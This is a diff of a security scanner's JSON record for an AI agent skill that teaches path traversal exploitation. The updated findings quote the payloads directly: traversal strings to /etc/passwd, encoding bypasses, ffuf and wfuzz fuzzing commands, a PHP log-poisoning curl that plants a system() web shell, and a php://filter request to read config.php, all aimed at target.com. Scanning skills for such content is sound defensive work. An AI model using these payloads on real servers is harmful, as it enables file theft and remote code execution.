@@ -7,28 +7,28 @@
   "description": "Identify and exploit file path traversal (directory traversal) vulnerabilities that allow attackers to read arbitrary files on the server, potentially including sensitive configuration files, credentials, and source code.",
   "stars": 12,
   "category": "coding",
-  "commit": "b89b2f59bcd776f96526ce61d77fcb9bd0821a9f",
+  "commit": "5fe45e5965f0496e535e9cac866b06e5c3e87c87",
   "contentHash": "7eae510bf33f9a97be2b95a1de157b75f2b331ac6c1814133a28580dfda5d9d4",
   "repoCreatedAt": "2026-01-19T14:28:55Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scannedAt": "2026-11-08T09:45:03.483Z",
   "scan": {
     "findings": [
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 78,
-        "excerpt": "# Parameters that often handle files",
+        "line": 79,
+        "excerpt": "?file=",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 111,
-        "excerpt": "# Basic Linux traversal",
+        "line": 112,
+        "excerpt": "../../../etc/passwd",
         "disclosed": false,
         "automatic": false
       },
@@ -57,48 +57,48 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 133,
-        "excerpt": "# Direct absolute path (Linux)",
+        "line": 134,
+        "excerpt": "/etc/passwd",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 150,
-        "excerpt": "# When ../ is stripped once",
+        "line": 151,
+        "excerpt": "....//....//....//etc/passwd",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 169,
-        "excerpt": "# Null byte injection (older PHP versions)",
+        "line": 170,
+        "excerpt": "../../../etc/passwd%00.jpg",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 183,
-        "excerpt": "# When path must start with expected directory",
+        "line": 184,
+        "excerpt": "/var/www/images/../../../etc/passwd",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 193,
-        "excerpt": "# Unicode/UTF-8 encoding",
+        "line": 194,
+        "excerpt": "..%c0%af..%c0%af..%c0%afetc/passwd",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 215,
-        "excerpt": "# System files",
+        "line": 216,
+        "excerpt": "/etc/passwd           # User accounts",
         "disclosed": false,
         "automatic": false
       },
@@ -121,32 +121,24 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 260,
-        "excerpt": "# System files",
+        "line": 261,
+        "excerpt": "C:\\windows\\win.ini",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 300,
-        "excerpt": "# Basic traversal fuzzing",
+        "line": 301,
+        "excerpt": "ffuf -u \"http://target.com/image?filename=FUZZ\" \\",
         "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 314,
-        "excerpt": "# Traverse to /etc/passwd",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
-        "ruleId": "shell",
-        "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 332,
-        "excerpt": "# Inject PHP code into logs",
+        "line": 315,
+        "excerpt": "wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\",
         "disclosed": false,
         "automatic": false
       },
@@ -160,6 +152,14 @@
         "hosts": [
           "target.com"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity-file-path-traversal/SKILL.md",
+        "line": 333,
+        "excerpt": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://target.com/",
+        "disclosed": false,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -184,14 +184,6 @@
         ]
       },
       {
-        "ruleId": "shell",
-        "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 346,
-        "excerpt": "# Inject via User-Agent",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
         "ruleId": "network",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
         "line": 347,
@@ -199,6 +191,14 @@
         "disclosed": true,
         "automatic": false,
         "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity-file-path-traversal/SKILL.md",
+        "line": 347,
+        "excerpt": "curl -A \"<?php system('id'); ?>\" \\",
+        "disclosed": false,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -210,14 +210,6 @@
         "hosts": []
       },
       {
-        "ruleId": "shell",
-        "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 358,
-        "excerpt": "# php://filter - Read source code as base64",
-        "disclosed": false,
-        "automatic": false
-      },
-      {
         "ruleId": "network",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
         "line": 359,
@@ -227,6 +219,14 @@
         "hosts": [
           "target.com"
         ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/antigravity-file-path-traversal/SKILL.md",
+        "line": 359,
+        "excerpt": "curl \"http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php\"",
+        "disclosed": false,
+        "automatic": false
       },
       {
         "ruleId": "network",
@@ -262,8 +262,8 @@
       {
         "ruleId": "shell",
         "file": "skills/antigravity-file-path-traversal/SKILL.md",
-        "line": 377,
-        "excerpt": "# Step 1: Identify potential parameters",
+        "line": 381,
+        "excerpt": "../../../etc/passwd",
         "disclosed": false,
         "automatic": false
       }
@@ -275,7 +275,7 @@
     },
     "score": 82,
     "band": "low",
-    "rulesVersion": "1.0.0",
+    "rulesVersion": "1.3.0",
     "filesScanned": 1,
     "filesSkipped": 0
   },
@@ -285,6 +285,12 @@
       "scannedAt": "2026-11-06T19:07:48.007Z",
       "score": 82,
       "rulesVersion": "1.0.0"
+    },
+    {
+      "commit": "5fe45e5965f0496e535e9cac866b06e5c3e87c87",
+      "scannedAt": "2026-11-08T09:45:03.483Z",
+      "score": 82,
+      "rulesVersion": "1.3.0"
     }
   ]
 }
